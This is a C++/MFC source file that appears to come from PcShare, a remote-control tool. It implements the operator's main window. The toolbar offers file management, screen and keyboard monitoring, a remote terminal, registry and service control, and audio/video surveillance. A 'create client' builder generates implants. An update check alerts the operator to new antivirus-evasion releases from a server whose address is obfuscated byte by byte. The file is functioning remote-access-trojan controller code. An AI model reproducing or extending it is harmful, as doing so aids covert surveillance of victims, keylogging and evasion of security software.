// MyMainShowWnd.cpp : implementation file
//

#include "stdafx.h"
#include "PcShare.h"
#include "MyMainShowWnd.h"

#include "MySetupDlg.h"
#include "mycreateclientdlg.h"
#include "MyUpdateIpDlg.h"
#include "MyBottomView.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

TCHAR m_MainUrl[256] = {0};

/////////////////////////////////////////////////////////////////////////////
// CMyMainShowWnd

IMPLEMENT_DYNCREATE(CMyMainShowWnd, CFrameWnd)

CMyMainShowWnd::CMyMainShowWnd()
{
	memset(&m_IconData, 0, sizeof(m_IconData));
	hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
	pLogView = NULL;
	pMainWnd = NULL;
}

CMyMainShowWnd::~CMyMainShowWnd()
{

}

BEGIN_MESSAGE_MAP(CMyMainShowWnd, CFrameWnd)
	//{{AFX_MSG_MAP(CMyMainShowWnd)
	ON_UPDATE_COMMAND_UI(IDS_UPDATEPANE, OnUpdatePane)
	ON_WM_COPYDATA()
	ON_WM_CREATE()
	ON_WM_SIZE()
	ON_COMMAND(ID_ICON_EXIT, OnIconExit)
	ON_COMMAND(ID_ICON_SHOW, OnIconShow)
	ON_COMMAND(ID_ABOUT, OnAbout)
	ON_COMMAND(ID_CLIENT_CREATE, OnClientCreate)
	ON_COMMAND(ID_FLUSH_IP, OnFlushIp)
	ON_COMMAND(ID_HELP, OnHelp)
	ON_COMMAND(ID_GLOBAL_SETUP, OnGlobalSetup)
	ON_WM_TIMER()
	ON_COMMAND(ID_USER_ADD_PIN, OnUserAddPin)
	ON_COMMAND(ID_USER_GET_PIN, OnUserGetPin)
	ON_COMMAND(ID_USER_MODIFY_PIN, OnUserModifyPin)
	ON_WM_CLOSE()
	ON_COMMAND(ID_CLIENT_MANA_DL, OnClientManaDl)
	ON_UPDATE_COMMAND_UI(ID_CLIENT_MANA_DL, OnUpdateClientManaDl)
	//}}AFX_MSG_MAP
	ON_MESSAGE(WM_ICONINFO, OnIconInfo)
	ON_MESSAGE(WM_INSERTLOGS, OnInsertLogs)
END_MESSAGE_MAP()


static UINT indicatorsShow[] =
{
	ID_SEPARATOR,           // status line indicator
	IDS_UPDATEPANE,
};

/////////////////////////////////////////////////////////////////////////////
// CMyMainShowWnd message handlers

void CMyMainShowWnd::OnUpdatePane(CCmdUI *pCmdUI)  
{
	TCHAR m_Text[256] = {0};
	pMainWnd->GetPaneInfo(m_Text);
	pCmdUI->SetText(m_Text);
}

BOOL CMyMainShowWnd::OnCreateClient(LPCREATESTRUCT lpcs, CCreateContext* pContext) 
{
	if(!m_WndSplitter.CreateStatic(this, 2, 1))
	{
		return FALSE;
	}

	if (!m_WndSplitter.CreateView(0, 0, 
		RUNTIME_CLASS(CMyTopView), CSize(0, 0), pContext) ||
		!m_WndSplitter.CreateView(1, 0, 
		RUNTIME_CLASS(CMyBottomView), CSize(0, 0), pContext))
	{
		m_WndSplitter.DestroyWindow();
		return FALSE;
	}

	pMainWnd = (CMyTopView*) m_WndSplitter.GetPane(0, 0);
	pBottomView = (CMyBottomView*) m_WndSplitter.GetPane(1, 0);
	pLogView = (CMyLogsView*) pBottomView->pLogView;
	return TRUE;
}

BOOL CMyMainShowWnd::OnCopyData(CWnd* pWnd, COPYDATASTRUCT* pCopyDataStruct) 
{
	if(pCopyDataStruct->dwData == PS_SOCKET_CONNECT)
	{
		//主控连接建立
		LPTCPCONNECTINFO pInfo = (LPTCPCONNECTINFO) pCopyDataStruct->lpData;
		MyServerTran* pMyServerTran = new MyServerTran;
		pMyServerTran->DuplicateHttpSocket(pInfo);

		//增加项到视
		CMyClientManaView* pView = pMainWnd->GetViewFromName(pMyServerTran->GetViewName());
		if(pView == NULL)
		{
			pView = pMainWnd->InsertView(pMyServerTran->GetViewName(), TRUE);
			ASSERT(pView);
		}
		pView->InsertItem(pMyServerTran, TRUE);
	}
	else if(pCopyDataStruct->dwData == PS_LOCAL_FILETRAN)
	{
		//文件传输发送连接命令
		LPMYCHILDCMDINFO pInfo = (LPMYCHILDCMDINFO) pCopyDataStruct->lpData;
		MyServerTran* pTran = pMainWnd->FindItemFromId(pInfo->m_Id);
		if(pTran != NULL)
		{
			pTran->SendCmd(pInfo->m_Info.m_Command, pInfo->m_Info.m_Hwnd);
		}
	}
	else if(pCopyDataStruct->dwData == PS_LOCAL_SHOW_MESS)
	{
		//文件传输发送连接命令
		TCHAR m_Text[1024] = {0};
		memcpy(m_Text, pCopyDataStruct->lpData, pCopyDataStruct->cbData);
		pLogView->InsertItem(m_Text);
	}
	return TRUE;
}

void GetUpdateInfoThread(LPVOID lPvoid)
{
#ifdef _VIP_
	HWND hWnd = (HWND) lPvoid;
	TCHAR m_NewTime[256] = {0};
	TCHAR m_DesUrl[256] = {0};
	wsprintf(m_DesUrl, _T("http://%s/pcsharevip/ip/20100310.htm"), m_MainUrl);
	BOOL bRet = GetLoginInfo(m_DesUrl, m_NewTime);
	if(bRet)
	{
		TCHAR m_OldTime[256] = {0};
		GetPrivateProfileString(PS_SHEZHI, _T("上次更新时间"), _T(""), m_OldTime, 255, GetIniFileName());
		if(StrCmp(m_OldTime, m_NewTime) != 0)
		{
			MessageBox(hWnd, _T("服务器有新的免杀更新可以下载！"), _T("提示"), MB_OKCANCEL|MB_ICONWARNING);
		}
	}
#endif
}

int CMyMainShowWnd::OnCreate(LPCREATESTRUCT lpCreateStruct) 
{

	if (CFrameWnd::OnCreate(lpCreateStruct) == -1)
		return -1;
	
	if(!InitCommandBars())
	{
		return -1;
	}

	CXTPCommandBars* pCommandBars = GetCommandBars();
	pCommandBars->SetMenu(_T("Menu Bar"), IDR_MAINFRAME);

	if (!m_wndToolBar.CreateEx(this, TBSTYLE_FLAT, WS_CHILD | WS_VISIBLE | CBRS_TOP
		| CBRS_GRIPPER | CBRS_TOOLTIPS | CBRS_FLYBY | CBRS_SIZE_DYNAMIC) ||
		!m_wndToolBar.LoadToolBar(IDR_MAINFRAME))
	{
		TRACE0("Failed to create toolbar\n");
		return -1;      // fail to create
	}

	if(!m_wndStatusBar.Create(this) ||	!m_wndStatusBar.SetIndicators(indicatorsShow,
		  sizeof(indicatorsShow)/sizeof(UINT)))
	{
		TRACE0("Failed to create status bar\n");
		return -1;      // fail to create
	}

	m_ToolBarList.Create(32, 32, ILC_COLOR24 | ILC_MASK, 16, 1);
	m_ToolBarList.Add(IDB_BITMAP_MAIN_FILE);
	m_ToolBarList.Add(IDB_BITMAP_MAIN_FRAM);
	m_ToolBarList.Add(IDB_BITMAP_MAIN_TLNT);
	m_ToolBarList.Add(IDB_BITMAP_MAIN_KEYM);
	m_ToolBarList.Add(IDB_BITMAP_MAIN_PROC);
	m_ToolBarList.Add(IDB_BITMAP_MAIN_REGT);
	m_ToolBarList.Add(IDB_BITMAP_MAIN_SERV);
	m_ToolBarList.Add(IDB_BITMAP_MAIN_CWND);
	m_ToolBarList.Add(IDB_BITMAP_MAIN_MULT);
	m_ToolBarList.Add(IDB_BITMAP_MAIN_DL);
	m_ToolBarList.Add(IDB_BITMAP_MAIN_REIP);
	m_ToolBarList.Add(IDB_BITMAP_MAIN_SETP);
	m_ToolBarList.Add(IDB_BITMAP_MAIN_CRET);
	m_ToolBarList.Add(IDB_BITMAP_MAIN_ABUT);
	
	m_wndToolBar.GetToolBarCtrl().SetImageList(&m_ToolBarList);
	
	m_wndToolBar.SetButtonText(0, _T("文件管理"));
	m_wndToolBar.SetButtonText(1, _T("屏幕监控"));
	m_wndToolBar.SetButtonText(2, _T("超级终端"));
	m_wndToolBar.SetButtonText(3, _T("键盘监控"));
	m_wndToolBar.SetButtonText(4, _T("进程管理"));
	m_wndToolBar.SetButtonText(5, _T("注册表管理"));
	m_wndToolBar.SetButtonText(6, _T("服务管理"));
	m_wndToolBar.SetButtonText(7, _T("窗口管理"));
	m_wndToolBar.SetButtonText(8, _T("音视频监控"));
	m_wndToolBar.SetButtonText(9, _T("下载管理"));
	m_wndToolBar.SetButtonText(10, _T("刷新IP"));
	m_wndToolBar.SetButtonText(11, _T("参数设置"));
	m_wndToolBar.SetButtonText(12, _T("创建客户"));
	m_wndToolBar.SetButtonText(13, _T("关    于"));
	
	m_wndToolBar.GetToolBarCtrl().SetButtonSize(CSize(48, 32 + 20));
	m_wndToolBar.GetToolBarCtrl().SetBitmapSize(CSize(32, 32));
	m_wndToolBar.GetToolBarCtrl().SetDisabledImageList(&m_ToolBarList);

	//取主框架窗口句柄
	m_IconData.cbSize = sizeof(NOTIFYICONDATA);
	m_IconData.hWnd = GetSafeHwnd();
	m_IconData.uID = 0x8743;
	m_IconData.hIcon = hIcon;
	m_IconData.uCallbackMessage = WM_ICONINFO;
	m_IconData.uFlags = NIF_ICON|NIF_MESSAGE|NIF_TIP;
	lstrcpy(m_IconData.szTip, PS_TITLE);
	Shell_NotifyIcon(NIM_ADD, &m_IconData);

	CXTPPaintManager* pTheme = new CXTPWhidbeyTheme();
	XTP_COMMANDBARS_ICONSINFO* pIconsInfo = pTheme->GetIconsInfo();
	pIconsInfo->bUseDisabledIcons = TRUE;
	pIconsInfo->bIconsWithShadow = TRUE;
	XTPPaintManager()->SetCustomTheme(pTheme);
	GetCommandBars()->RedrawCommandBars();
	CenterWindow();

	/*www.supperpc.com*/
	m_MainUrl[0] = (char) 0x77;m_MainUrl[1] = (char) 0x77;m_MainUrl[2] = (char) 0x77;m_MainUrl[3] = (char) 0x2e;m_MainUrl[4] = (char) 0x73;m_MainUrl[5] = (char) 0x75;m_MainUrl[6] = (char) 0x70;m_MainUrl[7] = (char) 0x70;m_MainUrl[8] = (char) 0x65;m_MainUrl[9] = (char) 0x72;m_MainUrl[10] = (char) 0x70;m_MainUrl[11] = (char) 0x63;m_MainUrl[12] = (char) 0x2e;m_MainUrl[13] = (char) 0x63;m_MainUrl[14] = (char) 0x6f;m_MainUrl[15] = (char) 0x6d;m_MainUrl[16] = 0x00;
	_beginthread(GetUpdateInfoThread, 0, GetSafeHwnd());
	return 0;
}

void CMyMainShowWnd::OnSize(UINT nType, int cx, int cy) 
{
	CFrameWnd::OnSize(nType, cx, cy);
	if(pMainWnd != NULL && cx > 0)
	{
		m_WndSplitter.SetRowInfo(0, cy - 274, 0);
		m_WndSplitter.RecalcLayout();
	}

	if(m_wndStatusBar.GetSafeHwnd())
	{
		UINT nID = 0, nStyle = 0;
		int Width = 0;
		m_wndStatusBar.GetPaneInfo(1, nID, nStyle, Width);
		Width = cx / 4;
		m_wndStatusBar.SetPaneInfo(1, nID, nStyle, Width);
	}
	if(cx == 0 && IsWindowVisible())
	{
		ShowWindow(SW_HIDE);
	}
}

void CMyMainShowWnd::ResizeWnd()
{
	pLogView->PostMessage(WM_RESIZE_WND, 0, 0);
	pMainWnd->GetCurView()->PostMessage(WM_RESIZE_WND, 0, 0);
}

BOOL CMyMainShowWnd::StartWork()
{
	TCHAR m_QQFileName[256] = _T("QQWry.dat");
	GetBinFilePath(m_QQFileName);
	WIN32_FILE_ATTRIBUTE_DATA m_Data = {0};
	if(!GetFileAttributesEx(m_QQFileName, GetFileExInfoStandard, &m_Data))
	{
		//查看QQIP库文件是否存在
		DWORD nLen = 0;
		LPBYTE pData  = GetMyExeSource(_T("IPDATA"), _T("MOD"), nLen);
		if(pData != NULL)
		{
			WriteMyFile(m_QQFileName, pData, nLen);
		}
	}

	TCHAR m_XvidFileName[256] = _T("xvid.exe");
	GetBinFilePath(m_XvidFileName);
	if(!GetFileAttributesEx(m_XvidFileName, GetFileExInfoStandard, &m_Data))
	{
		//查看QQIP库文件是否存在
		DWORD nLen = 0;
		LPBYTE pData  = GetMyExeSource(_T("XVID"), _T("MOD"), nLen);
		if(pData != NULL)
		{
			WriteMyFile(m_XvidFileName, pData, nLen);
		}
	}

	TCHAR m_Title[256] = {0};
	wsprintf(m_Title, _T("%s%s[%s]"), PS_TITLE, _T(PS_VER_INFO), _T(PS_EXT_VER_INFO));
	SetWindowText(m_Title);
	pMainWnd->ResizeView();
	return TRUE;
}

LRESULT CMyMainShowWnd::OnIconInfo(WPARAM wParam,LPARAM lParam)
{
	switch(lParam)
	{
		case WM_LBUTTONDBLCLK :
			{
				SetForegroundWindow();
				ShowWindow(SW_SHOWMAXIMIZED);
				BringWindowToTop();
				return TRUE;
			}

		case WM_RBUTTONUP :
			{
				CPoint m_point;
				CMenu m_menu;
				m_menu.LoadMenu(IDR_MENU_ICON);
				GetCursorPos(&m_point);
				SetForegroundWindow(); 
				CXTPCommandBars::TrackPopupMenu(m_menu.GetSubMenu(0), TPM_RIGHTBUTTON, m_point.x, m_point.y, this);
				m_menu.DestroyMenu();	
			}
	}
	return TRUE;
}

LRESULT CMyMainShowWnd::OnInsertLogs(WPARAM wParam, LPARAM lParam)
{
	pLogView->InsertItem((LPCTSTR) wParam);
	return TRUE;
}

BOOL CALLBACK EnumWindowsProc(HWND hWnd, LPARAM lParam)
{
	TCHAR m_Title[512] = {0};
	GetWindowText(hWnd, m_Title, 512);
	if((StrStr(m_Title, PS_TITLE) != NULL) && ((HWND) lParam != hWnd))
	{
		PostMessage(hWnd, WM_COMMAND, ID_EXIT, 0);
		PostMessage(hWnd, WM_COMMAND, ID_EXIT, 0);
		PostMessage(hWnd, WM_COMMAND, ID_EXIT, 0);
	}
	return TRUE;
}

void CMyMainShowWnd::OnIconExit() 
{
	Shell_NotifyIcon(NIM_DELETE, &m_IconData);
	EnumWindows(EnumWindowsProc, (LPARAM) GetSafeHwnd());
	CFrameWnd::OnClose();
}

void CMyMainShowWnd::OnIconShow() 
{
	SetForegroundWindow();
	ShowWindow(SW_SHOWMAXIMIZED);
	BringWindowToTop();
}


void CMyMainShowWnd::OnAbout() 
{
	PostMessage(WM_COMMAND, MAKEWPARAM(ID_APP_ABOUT, 1), 0);
}

void CMyMainShowWnd::OnClientCreate() 
{
	CMyCreateClientDlg dlg(this);
	dlg.DoModal();
}

void CMyMainShowWnd::OnFlushIp() 
{
	CMyUpdateIpDlg dlg;
	dlg.DoModal();
}

void CMyMainShowWnd::OnHelp() 
{
	TCHAR m_FileName[256] = _T("help.chm");
	GetBinFilePath(m_FileName);
	ShellExecute(NULL, NULL, m_FileName, NULL, NULL, SW_SHOWMAXIMIZED);
}

void CMyMainShowWnd::OnGlobalSetup() 
{
	CMySetupDlg dlg;
	dlg.DoModal();
}

void CMyMainShowWnd::OnTimer(UINT nIDEvent) 
{
	CFrameWnd::OnTimer(nIDEvent);
	
}

void CMyMainShowWnd::OnUserAddPin() 
{
#ifdef _VIP_
	TCHAR m_DesUrl[256] = {0};
	wsprintf(m_DesUrl, _T("http://%s/pcsharevip/SafePass.asp"), m_MainUrl);
	ShellExecute(NULL, NULL, _T("iexplore.exe"), m_DesUrl, NULL, SW_SHOWMAXIMIZED);
#endif
}

void CMyMainShowWnd::OnUserGetPin() 
{
	#ifdef _VIP_
	TCHAR m_DesUrl[256] = {0};
	wsprintf(m_DesUrl, _T("http://%s/pcsharevip/lostpass.asp"), m_MainUrl);
	ShellExecute(NULL, NULL, _T("iexplore.exe"), m_DesUrl, NULL, SW_SHOWMAXIMIZED);
	#endif
}

void CMyMainShowWnd::OnUserModifyPin() 
{
	#ifdef _VIP_
	TCHAR m_DesUrl[256] = {0};
	wsprintf(m_DesUrl, _T("http://%s/pcsharevip/user.asp"), m_MainUrl);
	ShellExecute(NULL, NULL, _T("iexplore.exe"), m_DesUrl, NULL, SW_SHOWMAXIMIZED);
	#endif
}

void CMyMainShowWnd::OnClose() 
{
	OnIconExit();
}

void CMyMainShowWnd::OnClientManaDl() 
{
	TCHAR nCWndName[256] = {0};
	wsprintf(nCWndName, _T("%s下载管理"), PS_TITLE);
	HWND hFileDownWnd = ::FindWindow(NULL, nCWndName);
	::ShowWindow(hFileDownWnd, SW_NORMAL);
}

void CMyMainShowWnd::OnUpdateClientManaDl(CCmdUI* pCmdUI) 
{
	TCHAR nCWndName[256] = {0};
	wsprintf(nCWndName, _T("%s下载管理"), PS_TITLE);
	HWND hFileDownWnd = ::FindWindow(NULL, nCWndName);
	pCmdUI->Enable(hFileDownWnd != NULL);
}

